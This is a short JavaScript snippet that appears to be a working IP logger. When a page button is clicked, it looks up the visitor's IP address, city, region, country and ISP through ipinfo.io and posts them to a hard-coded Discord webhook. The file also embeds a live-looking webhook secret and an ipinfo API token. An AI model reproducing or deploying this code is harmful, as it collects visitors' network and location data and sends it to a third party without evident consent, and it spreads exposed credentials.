async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=764a6373117b28');
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching IP info:', error);
    }
}

async function sendToDiscord(ipInfo) {
    const webhookURL = 'https://discord.com/api/webhooks/1249563638977531925/uKfEV4WY6UJVbUv8bx-OC6d1ZPFYe6MewF6Qmeb21dkajwjie1i4A5P9cnFn0JFdLqNM';
    
    const data = {
        content: `IP Information:\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nCountry: ${ipInfo.country}\nOrg: ${ipInfo.org}`
    };
    
    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (response.ok) {
            console.log('IP Information sent to Discord successfully!');
        } else {
            console.error('Failed to send IP Information to Discord:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

document.getElementById('sendIpInfoButton').onclick = async function() {
    const ipInfo = await getIPInfo();
    if (ipInfo) {
        await sendToDiscord(ipInfo);
    }
};
